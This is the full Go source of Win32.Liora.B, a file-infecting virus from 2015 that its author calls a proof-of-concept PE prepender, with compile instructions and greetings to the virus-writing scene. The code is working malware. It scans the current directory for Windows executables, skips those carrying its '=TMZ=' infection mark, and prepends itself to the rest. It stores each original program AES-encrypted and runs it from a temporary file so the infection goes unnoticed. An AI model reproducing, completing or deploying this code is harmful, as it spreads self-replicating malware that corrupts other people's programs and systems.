/*
* Win32.Liora.B - This is a POC PE prepender written in Go by TMZ (2015).
*
* Win32.Liora.B (May 2015) - Simple binary infector in GoLang (prepender).
* This version encrypts the host code with AES and decrypts it at runtime.
* It's almost a direct port from my GoLang ELF infector Linux.Liora, just a few tweaks.
*
* Compile with: go build -i liora.go (where go >= 1.4.2)
* It has no external dependencies so it should compile under most systems (x86 and x86_64).
*
* Use at your own risk, I'm not responsible for any damages that this may cause.
*
* A big shout for those who keeps the scene alive: herm1t, alcopaul, SPTH, hh86, boojum, R3s1stanc3 and many others :)
*
* Feel free to email me: tmz@null.net || You can also find me at http://vxheaven.org/ and on Twitter @TMZvx
* 
* http://vx.thomazi.me
*/

package main

import (
    "bufio"
    "fmt"
    "io"
    "io/ioutil"
    "os"
	"os/exec"
	"strings"
	"crypto/aes"
   	"crypto/cipher"
	"math/rand"
	"time"	

)

func check(e error) {
	// Reading files requires checking most calls for errors.
	// This helper will streamline our error checks below.
    if e != nil {
        panic(e)
    }
}

func CheckMZ(file string) bool {
	
	f, err := os.Open(file)
    check(err)
	bytes := make([]byte, 2) //read the magic number
    f.Read(bytes)
	f.Close()
	
	//check if is an PE
	if strings.Contains(string(bytes), "MZ"){
		return true 
	} else {
		return false
	}

}

func CheckInfected(file string) bool {

	_mark := "=TMZ=" //infection mark
 	fi, err := os.Open(file)
	check(err)
	buf := make([]byte, 5)
	
    for {
        // read a chunk of 5 bytes
		_, err := fi.Read(buf)
        if err != nil {
            if err == io.EOF {
                break //exits when we reach EOF
            }
            fmt.Println(err)
        }
		
		if string(buf) == _mark { //if chunk = mark
			fi.Close()	
			return true //file is already infected!
			break
		}
		
	}	
	fi.Close()
	return false //not infected
	
}

func Infect(file string) {

	dat, err := ioutil.ReadFile(file) //read host
	check(err)	
	vir, err := ioutil.ReadFile(os.Args[0]) //read virus
	check(err)
	
	encDat := Encrypt(dat) //encrypt host
	
	f, err := os.OpenFile(file, os.O_RDWR, 0666) //open host
    check(err)
	
  	w := bufio.NewWriter(f)
	w.Write(vir) //write virus
	w.Write(encDat) //write encypted host
    w.Flush() //make sure we are all set
	f.Close()
	
}
   
func RunHost() {
	
	hostbytes := Rnd(8) + ".exe" //generate random name
	
	h, err := os.Create(hostbytes) //create tmp with above name
	check(err)
	
	infected_data, err := ioutil.ReadFile(os.Args[0]) //Read myself
    check(err)
	allSZ := len(infected_data) //get file full size
	hostSZ := allSZ - 2665472 //calculate host size
	
	f, err := os.Open(os.Args[0]) //open host
    check(err)
		
	f.Seek(2665472, os.SEEK_SET) //go to host start
	
	hostBuf := make([]byte, hostSZ)
	f.Read(hostBuf) //read it

	plainHost := Decrypt(hostBuf) //decrypt host

	w := bufio.NewWriter(h)
	w.Write(plainHost) //write plain host to tmp file
    w.Flush() //make sure we are all set
	h.Close()
	f.Close()
	
	os.Chmod(hostbytes, 0755) //give it proper permissions
	cmd := exec.Command(hostbytes) 
	cmd.Start() //execute it
	err = cmd.Wait()
	os.Remove(hostbytes)
}
 
func Encrypt(toEnc []byte) []byte {
	
	key := "SUPER_SECRET_KEY" // 16 bytes!
    block,err := aes.NewCipher([]byte(key))
	check(err)
	
	// 16 bytes for AES-128, 24 bytes for AES-192, 32 bytes for AES-256
    ciphertext := []byte("ASUPER_SECRET_IV") 
    iv := ciphertext[:aes.BlockSize] // const BlockSize = 16
	
	encrypter := cipher.NewCFBEncrypter(block, iv)

    encrypted := make([]byte, len(toEnc))
    encrypter.XORKeyStream(encrypted, toEnc)

    //fmt.Printf("%s encrypted to %v\n", toEnc, encrypted)
	return encrypted
	
}

func Decrypt(toDec []byte) []byte {

	key := "SUPER_SECRET_KEY" // 16 bytes
    block,err := aes.NewCipher([]byte(key))
	check(err)
	
	// 16 bytes for AES-128, 24 bytes for AES-192, 32 bytes for AES-256
    ciphertext := []byte("ASUPER_SECRET_IV") 
    iv := ciphertext[:aes.BlockSize] // const BlockSize = 16
	
	decrypter := cipher.NewCFBDecrypter(block, iv) // simple

    decrypted := make([]byte, len(toDec))
    decrypter.XORKeyStream(decrypted, toDec)
   
	return decrypted
}

func Rnd(n int) string {
	
	rand.Seed(time.Now().UTC().UnixNano())
	var letters = []rune("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ")
    b := make([]rune, n)
    for i := range b {
        b[i] = letters[rand.Intn(len(letters))]
    }
    return string(b)

}

func GetSz(file string) int64 {

	myHnd, err := os.Open(os.Args[0])
	check(err)
	defer myHnd.Close()
	myStat, err := myHnd.Stat()
	check(err)
	mySZ := myStat.Size()
	myHnd.Close()
	return mySZ
}

func main() {

	virPath := os.Args[0]

	files, _ := ioutil.ReadDir(".")
	for _, f := range files {
		if CheckMZ(f.Name()) == true {
			if CheckInfected(f.Name()) == false {
				if !strings.Contains(virPath, f.Name()) {
					Infect(f.Name())
				}	
			}	
		}
	}

	if GetSz(os.Args[0]) > 2665472 {
		RunHost()
	} else {
		os.Exit(0)
	}
}
